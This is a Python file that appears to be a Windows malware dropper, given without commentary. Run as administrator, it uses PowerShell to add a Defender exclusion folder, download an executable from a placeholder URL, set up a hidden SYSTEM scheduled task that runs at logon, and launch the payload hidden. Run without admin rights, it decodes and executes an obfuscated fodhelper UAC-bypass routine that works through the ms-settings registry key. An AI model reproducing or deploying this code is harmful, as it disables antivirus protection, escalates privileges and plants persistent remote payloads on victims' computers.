# Start of desired section
import subprocess
import ctypes
import threading
import sys
import os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def ed():
    if is_admin():
        powershell = [
    "$directoryPath = Join-Path $HOME 'kkl'",
    "Add-MpPreference -ExclusionPath $directoryPath",
    "$url = 'ssdd'",
    "$targetDirectory = Join-Path $HOME 'kkl'",
    "if (-not (Test-Path -Path $targetDirectory)) {New-Item -Path $targetDirectory -ItemType Directory -Force}",
    "$outputFile = Join-Path $targetDirectory 'pe.exe'",
    "$programName = 'pe'",
    "$programPath = $outputFile ",
    "Invoke-WebRequest -Uri $url -OutFile $outputFile",
    "$installerPath = $outputFile",
    "$taskName = 'User_Feed_ESRV'",
    "$taskPath = $programPath ",
    "schtasks /create /SC ONLOGON /TN $taskName /TR $taskPath /RU SYSTEM /RL HIGHEST /IT",
    "$taskFolder = '\'",
    "$objService = New-Object -ComObject 'Schedule.Service'",
    "$objService.Connect()",
    "$objRootFolder = $objService.GetFolder($taskFolder)",
    "$objTask = $objRootFolder.GetTask($taskName)",
    "$objTaskDefinition = $objTask.Definition",
    "$objTaskDefinition.Settings.StopIfGoingOnBatteries = $false",
    "$objTaskDefinition.Settings.DisallowStartIfOnBatteries = $false",
    "$objTaskDefinition.Settings.Hidden = $true",
    "$objTaskDefinition.Settings.StartWhenAvailable = $true",
    "$objTaskDefinition.Settings.Priority = 1",
    "$objRootFolder.RegisterTaskDefinition($taskName, $objTaskDefinition, 6, $null, $null, 0, $null)",
    "Start-Process -FilePath $installerPath -PassThru -WindowStyle Hidden -Verb RunAs"
]


        powershell_com = " ; ".join(powershell)


        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", powershell_com], shell=True)



    else:
        def cu(data):
        

            re = {'d': 'a', 'a': 'd', 'L': 'k', 'k': 'L', 'n': ')', ')': 'n','u':'p','p':'u'}

            decoded_data = ""
            for char in data:
                decoded_char = re.get(char, char)  
                decoded_data += decoded_char
            return decoded_data

        en="""
exe_file_udth = os.udth.dbsudth(sys.drgv[0]n
uowershell_commd)a = f'New-ItemProuerty -Pdth "HKCU:\Softwdre\Cldsses\ms-setti)gs\Shell\Oue)\commd)a" -Ndme "(Defdpltn" -Vdlpe "{exe_file_udth}"'
spburocess.rp)(["uowershell.exe", "-v", "2", "-commd)a", uowershell_commd)a], shell=Trpen
spburocess.rp)(["uowershell.exe", "-NoProfile", "-Execptio)Policy", "Byudss", "-Commd)a", "foaheluer.exe"], shell=Trpen
"""     
        de = cu(en)
        exec(de)
        sys.exit(1)

def run_powershell_thread():
    ed()

if __name__ == "__main__":
  
    powershell_thread = threading.Thread(target=run_powershell_thread)

    
    powershell_thread.start()
# End of desired section